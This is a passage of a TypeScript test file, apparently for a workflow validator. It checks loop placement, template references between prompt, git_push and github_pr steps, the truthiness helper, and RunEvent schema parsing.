    const push = { id: "push", name: "Push", kind: "git_push" };
    expect(errorsOf([review, push, stop("push.output")])[0]).toContain('step "push" has no text output');
    // `fix` is only in the inner loop's body, not directly in the outer one.
    const inner = { id: "inner", name: "Inner", kind: "loop", to: "fix", maxIterations: 2 };
    const nested = errorsOf([review, fix, inner, { id: "outer", name: "Outer", kind: "loop", to: "review", maxIterations: 2, stop: { when: "value", ref: "fix.output", is: "truthy" } }]);
    expect(nested[0]).toContain('step "fix" is inside a nested loop');
  });

  test("github_pr cannot sit in a loop body", () => {
    const steps = [
      { id: "impl", name: "Implement", kind: "prompt", prompt: "go" },
      { id: "push", name: "Push", kind: "git_push" },
      { id: "pr", name: "PR", kind: "github_pr", titleFrom: "impl", bodyFrom: "impl" },
      { id: "again", name: "Again", kind: "loop", to: "impl", maxIterations: 2 },
    ];
    expect(errorsOf(steps)).toEqual(["steps.2 (pr): github_pr cannot run inside a loop (it would open one pull request per iteration)"]);
    expect(errorsOf([...steps.slice(0, 2), steps[3], steps[2]])).toEqual([]);
  });

  test("body steps may reference later body steps' .output only", () => {
    const fixRef = { ...fix, prompt: "fix {{steps.review.output}}" };
    const reviewRef = (prompt: string) => ({ ...review, prompt });
    expect(errorsOf([reviewRef("last fix: {{steps.fix.output}}"), fixRef, loop()])).toEqual([]);
    expect(errorsOf([reviewRef("{{steps.fix.structured}}"), fixRef, loop()])[0]).toContain(
      'references later step "fix" of this loop; only steps.fix.output (previous iteration) is available',
    );
    const after = { id: "after", name: "After", kind: "prompt", prompt: "a" };
    expect(errorsOf([reviewRef("{{steps.after.output}}"), fixRef, loop(), after])[0]).toContain("which is not an earlier step");
    // Enclosing body: a step in the inner loop may reference a later step of the outer body.
    const steps = [
      { id: "plan", name: "Plan", kind: "prompt", prompt: "{{steps.fix.output}}" },
      reviewRef("{{steps.fix.output}}"),
      { id: "inner", name: "Inner", kind: "loop", to: "review", maxIterations: 2 },
      fixRef,
      { id: "outer", name: "Outer", kind: "loop", to: "plan", maxIterations: 2 },
    ];
    expect(errorsOf(steps)).toEqual([]);
    // Outside every loop, forward refs stay invalid.
    expect(errorsOf([{ ...review, prompt: "{{steps.fix.output}}" }, fix]).length).toBe(1);
  });

  test("templateVariables lists loop-back refs, and every listed variable validates", () => {
    const res = validateFlow({ ...baseFlow, steps: [review, fix, loop({ stop: { when: "ask", message: "Again? {{steps.fix.output}}" } })] });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    const vars = templateVariables(res.flow, 0);
    expect(vars).toContainEqual({ path: "steps.fix.output", description: 'Text output of "Fix" (previous iteration; empty on the first)' });
    expect(vars.some((v) => v.path === "steps.fix.structured" || v.path === "steps.again.output")).toBe(false);
    const prompt = vars.map((v) => `{{${v.path}}}`).join(" ");
    expect(validateFlow({ ...res.flow, steps: [{ ...review, prompt }, fix, res.flow.steps[2]] }).ok).toBe(true);
  });

  test("steps after a loop cannot reference the loop step, and templateVariables does not list it", () => {
    const after = (prompt: string) => ({ id: "after", name: "After", kind: "prompt", prompt });
    expect(errorsOf([review, fix, loop(), after("{{steps.again.output}}")])).toEqual([
      `steps.3 (after).prompt: {{steps.again.output}} references loop step "again", which has no output to use`,
    ]);
    const res = validateFlow({ ...baseFlow, steps: [review, fix, loop(), after("x")] });
    if (!res.ok) throw new Error(res.errors.join("\n"));
    const paths = templateVariables(res.flow, 3).map((v) => v.path);
    expect(paths).toContain("steps.fix.output");
    expect(paths.some((p) => p.startsWith("steps.again"))).toBe(false);
  });

  test("ask loop messages are validated templates", () => {
    expect(errorsOf([review, fix, loop({ stop: { when: "ask", message: "{{steps.later.output}}" } })])[0]).toContain("steps.2 (again).stop.message");
  });

  test("isTruthyValue", () => {
    for (const v of [false, null, undefined, 0, "", "  ", "false", " FALSE ", "No", "0", [], {}]) expect(isTruthyValue(v)).toBe(false);
    for (const v of [true, 1, -1, "yes", "true", "approved", "00", [0], { a: 1 }]) expect(isTruthyValue(v)).toBe(true);
  });
});

describe("RunEvent", () => {
  test("parses run.name and rejects an empty or oversized name", () => {
    const base = { runId: "r1", seq: 1, ts: 1 };
    expect(RunEvent.parse({ ...base, type: "run.name", payload: { name: "Boot fix" } }).payload).toEqual({ name: "Boot fix" });
    expect(RunEvent.safeParse({ ...base, type: "run.name", payload: { name: "" } }).success).toBe(false);
    expect(RunEvent.safeParse({ ...base, type: "run.name", payload: { name: "x".repeat(120) } }).success).toBe(true);
    expect(RunEvent.safeParse({ ...base, type: "run.name", payload: { name: "x".repeat(121) } }).success).toBe(false);
  });

  test("parses loop.repeat, skipped finishes and iteration starts", () => {
    const base = { runId: "r1", seq: 1, ts: 1, stepId: "again" };
    const repeat = { ...base, type: "loop.repeat", payload: { toStepId: "review", iteration: 2, maxIterations: 3, stepIds: ["review", "fix"] } };
    expect(RunEvent.parse(repeat)).toEqual(repeat as never);
    expect(RunEvent.safeParse({ ...base, type: "step.finished", payload: { status: "skipped" } }).success).toBe(true);
    expect(RunEvent.safeParse({ ...base, type: "step.started", payload: { iteration: 2 } }).success).toBe(true);
    expect(RunEvent.safeParse({ ...base, type: "step.started", payload: { iteration: 1 } }).success).toBe(false);
  });
});
